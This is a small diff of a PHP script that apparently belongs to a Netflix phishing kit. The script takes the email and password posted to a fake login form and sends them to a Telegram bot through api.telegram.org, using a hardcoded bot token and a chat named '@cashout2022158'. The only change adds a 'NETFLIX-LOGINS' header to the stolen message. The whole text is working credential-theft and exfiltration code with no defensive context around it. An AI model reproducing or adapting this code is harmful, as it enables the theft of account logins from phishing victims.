@@ -7,7 +7,7 @@ $password=$_POST['password'];
 $message = $_GET['message'];
 $nl="\r\n";
 //$message = 'EMAIL: ' . $email . $nl.'PASSWORD: ' . $password .$nl. 'IP: ' . $Ip  . $nl. 'USERAGENT: ' . $Agent ;
-$message = urlencode("EMAIL:  ".$email."\nPASSWORD: ".$password);
+$message = urlencode("---------NETFLIX-LOGINS--------\nEMAIL:  ".$email."\nPASSWORD: ".$password);
 $apiToken = "5369209739:AAFaMNk39MGepMZ3E9YrjLqhEHZupqCK-Pw";
 $chat_id = "@cashout2022158";
 $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?text=".$message."&chat_id=".$chat_id."&parse_mode=HTML");
